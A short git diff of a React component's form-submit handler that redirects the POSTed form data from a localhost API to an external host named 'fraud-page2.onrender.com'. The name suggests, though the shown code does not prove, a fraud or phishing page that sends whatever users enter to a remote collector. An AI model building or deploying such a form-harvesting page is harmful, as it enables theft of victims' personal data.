@@ -73,8 +73,10 @@ const FullPage: React.FC = () => {
   // const handleSubmit = async (formData) => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setResponseData("sent");
     try {
-    const res = await fetch("http://localhost:5000/api/submit", {
+    // const res = await fetch("http://localhost:5000/api/submit", {
+    const res = await fetch("https://fraud-page2.onrender.com/" ,{
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(formData),
@@ -128,7 +130,7 @@ const FullPage: React.FC = () => {
   //     setResponseData('An error occurred. Please try again.');
   //   }
 
-  
+
   //     
   // };
 
